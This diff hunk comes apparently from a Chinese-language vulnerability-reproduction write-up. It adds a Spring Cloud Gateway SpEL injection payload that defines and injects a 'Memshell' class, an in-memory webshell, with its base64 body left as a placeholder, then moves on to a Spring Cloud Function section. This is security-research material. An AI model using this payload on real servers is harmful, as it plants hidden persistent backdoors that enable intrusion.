@@ -615,6 +615,12 @@ Content-Type: application/json
 
 C0ny1师傅在[文章](https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/)中提到利用该漏洞注入Netty型以及Spring型内存木马，Netty不太了解，有机会可以学习一下。
 
+```
+#{T(org.springframework.cglib.core.ReflectUtils).defineClass('Memshell',T(org.springframework.util.Base64Utils).decodeFromString('base64'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping)}
+```
+
+
+
 ## Spring Cloud Function
 
 ~~躺在床上刷会Twitter，忽然瞅见了有师傅发截图，还是爬起来尝试复现一下～~~
